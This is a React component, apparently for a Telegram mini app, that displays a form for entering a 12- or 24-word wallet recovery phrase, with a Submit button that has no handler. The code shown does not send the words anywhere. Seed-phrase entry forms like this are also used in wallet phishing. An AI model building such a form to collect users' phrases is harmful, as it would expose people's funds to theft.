"use client";

import { Button, Input, Title } from "@telegram-apps/telegram-ui";
import { useState } from "react";

export default function AuthPage() {
	const [wordCount, setWordCount] = useState(24);
	const [words, setWords] = useState<string[]>(Array(24).fill(""));

	const inputs = Array.from({ length: wordCount }, (_, i) => i + 1);

	const handleWordChange = (index: number, value: string) => {
		const newWords = [...words];
		newWords[index] = value.trim();
		setWords(newWords);
	};

	const isFormValid = words.slice(0, wordCount).every(word => word.length > 0);

	return (
		<div className="container mx-auto px-6 py-12 max-w-4xl">
			<Title weight="2" className="mb-4 text-center text-3xl text-tg-text">
				Enter your recovery phrase
			</Title>
			<Title
				weight="3"
				className="mb-5 text-center text-lg text-tg-text text-gray-400"
			>
				Please enter your recovery phrase to access your wallet.
			</Title>

			<div className="flex justify-center gap-2 mb-6">
				<Button
					size="m"
					onClick={() => setWordCount(24)}
					className={` ${
						wordCount === 24
							? "bg-blue-500 text-white"
							: "bg-gray-700 text-gray-300"
					}`}
				>
					24 words
				</Button>
				<Button
					size="m"
					onClick={() => setWordCount(12)}
					className={` ${
						wordCount === 12
							? "bg-blue-500 text-white"
							: "bg-gray-700 text-gray-300"
					}`}
				>
					12 words
				</Button>
			</div>

			<div>
				<div className="grid grid-cols-2 gap-4">
					{inputs.map((number) => (
						<Input 
							key={number} 
							placeholder={`${number}`} 
							autoComplete="off"
							value={words[number - 1]}
							onChange={(e) => handleWordChange(number - 1, e.target.value)}
						/>
					))}
				</div>
			</div>
			<div className="flex justify-center mt-6">
				<Button 
					size="m" 
					disabled={!isFormValid}
					className={!isFormValid ? "opacity-50" : ""}
				>
					Submit
				</Button>
			</div>
		</div>
	);
}
